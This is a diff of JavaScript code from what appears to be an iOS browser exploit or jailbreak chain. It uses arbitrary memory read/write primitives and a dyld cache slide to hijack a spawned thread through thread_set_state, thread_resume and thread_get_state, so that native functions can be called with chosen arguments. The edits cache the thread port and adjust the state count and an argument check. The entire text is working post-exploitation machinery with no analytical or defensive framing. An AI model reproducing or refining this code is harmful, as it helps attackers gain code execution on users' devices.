@@ -118,6 +118,8 @@ function calls4arg(sym, r0, r1, r2, r3) {
 	return call4arg(addy, r0, r1, r2, r3);
 }
 
+var rth = 0;
+
 function callnarg() {
 	if (arguments.length < 1) {
 		return printf("error: tried to run callnarg without args. arguments.length=%d\n", arguments.length);
@@ -153,7 +155,14 @@ function callnarg() {
 		calls4arg("pthread_create", threadptr, 0, __stack_chk_fail_resolver + dyld_shc_slide, 0);
 		thread = read_u32(threadptr);
 		write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
+		rth = read_u32(th);
 	}
+
+	if (rth === 0) {
+		rth = read_u32(th);
+	}
+
+//	calls4arg("thread_suspend", rth, 0, 0, 0);
 
 	/*
 	 *  write first 4 to r0-r3, rest to stack
@@ -198,12 +207,8 @@ function callnarg() {
 	/*
 	 *  set the state
 	 */
-	calls4arg("thread_set_state", read_u32(th), ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);
-
-	/*
-	 *  probably un-necessary now, keeping in just in case for now
-	 */
-	calls4arg("thread_resume", read_u32(th), 0, 0, 0);
+	calls4arg("thread_set_state", rth, ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);
+	calls4arg("thread_resume", rth, 0, 0, 0);
 
 	/*
 	 *  spin wait for return
@@ -212,15 +217,15 @@ function callnarg() {
 		/*
 		 *  reset, it's used as input for thread_state size
 		 */
-		write_u32(count, 0x100);
-		calls4arg("thread_get_state", read_u32(th), ARM_THREAD_STATE, thread_state, count);
+		write_u32(count, 17);
+		calls4arg("thread_get_state", rth, ARM_THREAD_STATE, thread_state, count);
 
 		/*
 		 *  if the pc is in (resolver, resolver + 8), suspend the thread
 		 *  (to not spin endlessly), read r0 and return
 		 */
 		if (((read_u32(thread_state + (15 << 2)) - (__stack_chk_fail_resolver + dyld_shc_slide)) <= 8) && (read_u32(thread_state + (11 << 2)) == 0x1337)) {
-			calls4arg("thread_suspend", read_u32(th), 0, 0, 0);
+			calls4arg("thread_suspend", rth, 0, 0, 0);
 			return read_u32(thread_state);
 		}
 
@@ -262,7 +267,7 @@ function scall() {
 			args_to_pass.push(sptr(arguments[i]));
 		} else {
 			args_to_pass.push(arguments[i]);
-			if ((arguments[i] & 0xffff0000 == 0xffff0000 || arguments[i] & 0xffff0000 == 0xfffe0000)) {
+			if ((arguments[i] & 0xffff0000 == 0xffff0000 || arguments[i] & 0xffff0000 == 0xfffe0000) && (i == 1 || i == 3)) {
 				force_callnarg = true;
 			}
 		}
